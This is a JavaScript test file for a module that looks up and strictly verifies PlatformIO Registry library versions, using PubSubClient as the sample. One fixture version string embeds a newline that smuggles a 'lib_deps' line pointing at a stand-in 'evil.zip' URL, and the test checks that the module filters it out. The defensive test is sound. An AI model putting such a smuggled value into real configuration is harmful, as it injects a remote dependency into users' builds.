import test from 'node:test';
import assert from 'node:assert/strict';
import { libraryDetails, verifyLibraries, searchLibraries } from './registry.mjs';

// knolleary/PubSubClient as the Registry actually publishes it: two-part versions.
const DETAILS = {
  type: 'library', id: 89, owner: { username: 'knolleary' }, name: 'PubSubClient',
  version: { name: '2.8' }, description: 'A client library for MQTT messaging.',
  versions: [{ name: '2.8' }, { name: '2.7' }, { name: '2.6' }, { name: '2.5\nlib_deps = https://example.com/evil.zip' }],
};
const mockFetch = (t, payload) => t.mock.method(globalThis, 'fetch',
  async () => ({ ok: true, text: async () => JSON.stringify(payload) }));
const pkg = version => ({ id: 89, owner: 'knolleary', name: 'PubSubClient', version });

test('details keeps the Registry version strings verbatim, dropping only unsafe ones', async t => {
  mockFetch(t, DETAILS);
  const actual = await libraryDetails('knolleary', 'PubSubClient');
  assert.equal(actual.id, 89);
  assert.equal(actual.version, '2.8');
  // "2.8" is not normalised to "2.8.0"; the newline-bearing string cannot reach platformio.ini.
  assert.deepEqual(actual.versions, ['2.8', '2.7', '2.6']);
});

test('verify matches the Registry list exactly: no ranges, no aliases, no invented versions', async t => {
  mockFetch(t, DETAILS);
  await verifyLibraries([pkg('2.8')]);
  await verifyLibraries([pkg('2.6')]);
  for (const version of ['latest', '^7.4', '~2.8', '>=2', '2.8.0', '9.9.9']) {
    await assert.rejects(verifyLibraries([pkg(version)]), error => {
      assert.match(error.message, /版がRegistryの版一覧に見つかりません/);
      assert.match(error.message, /利用可能: 2\.8, 2\.7, 2\.6/);
      assert.ok(error.message.includes(`knolleary/PubSubClient@${version}`));
      return true;
    }, version);
  }
  await assert.rejects(verifyLibraries([{ ...pkg('2.8'), id: 90 }]), /識別情報が一致しません/);
});

test('search reports the candidates it had to drop instead of losing them', async t => {
  mockFetch(t, { total: 2, items: [
    { id: 89, type: 'library', owner: { username: 'knolleary' }, name: 'PubSubClient', version: { name: '2.8' } },
    { id: 90, type: 'library', owner: { username: 'broken' }, name: 'NoVersion', version: null },
  ] });
  const result = await searchLibraries('registrytest-excluded', 1);
  assert.deepEqual(result.items.map(p => `${p.owner}/${p.name}@${p.version}`), ['knolleary/PubSubClient@2.8']);
  assert.equal(result.excluded.length, 1);
  assert.equal(result.excluded[0].owner, 'broken');
  assert.equal(result.excluded[0].name, 'NoVersion');
  assert.ok(result.excluded[0].reason.length > 0);
});

test('real Registry: knolleary/PubSubClient@2.8 passes details and verify', async t => {
  let actual;
  try { actual = await libraryDetails('knolleary', 'PubSubClient'); }
  catch { return t.skip('Registryへ接続できないためスキップ'); }
  assert.equal(actual.id, 89);
  assert.ok(actual.versions.includes('2.8'), actual.versions.join(', '));
  await verifyLibraries([pkg('2.8')]);
  await assert.rejects(verifyLibraries([pkg('latest')]), /版がRegistryの版一覧に見つかりません/);
});
